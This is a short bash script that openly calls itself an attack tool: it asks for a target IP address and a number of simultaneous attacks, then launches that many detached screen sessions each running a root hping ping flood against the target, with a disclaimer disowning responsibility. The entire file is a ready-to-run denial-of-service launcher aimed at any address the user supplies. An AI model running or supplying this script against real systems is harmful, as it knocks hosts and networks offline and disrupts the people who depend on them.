#!/bin/bash
echo -e "This attack allows for around 6 MB/s ping traffic to desired IP."
echo -e "I can in no way be held responsible for your actions."
echo -e "Use responsibly and with care."
read -p "Press Enter to continue."
clear
read -p "How many simultaneous attacks? " amount
let amount=amount-1
read -p "What IP address? " ip
for ((i=0; i<=amount; i++)) do
	screen -d -m sudo hping --flood $ip
done
